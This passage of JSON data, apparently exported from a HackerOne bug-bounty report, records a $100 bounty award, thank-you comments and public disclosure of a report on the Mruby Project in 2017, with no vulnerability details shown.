soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-06T14:50:29.727Z","updated_at":"2017-02-06T14:50:29.727Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ston3","url":"/ston3"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467354,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of the Mruby Project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of the Mruby Project!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-07T01:26:47.721Z","updated_at":"2017-02-07T01:26:47.721Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"100.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"ston3","url":"/ston3"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467357,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T01:26:54.070Z","updated_at":"2017-02-07T01:26:54.070Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1467912,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for bounty.","markdown_message":"\u003cp\u003eThanks for bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-07T08:52:41.554Z","updated_at":"2017-02-07T08:52:41.554Z","actor":{"username":"ston3","cleared":false,"url":"/ston3","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1528912,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-09T01:26:59.052Z","updated_at":"2017-03-09T01:26:59.052Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}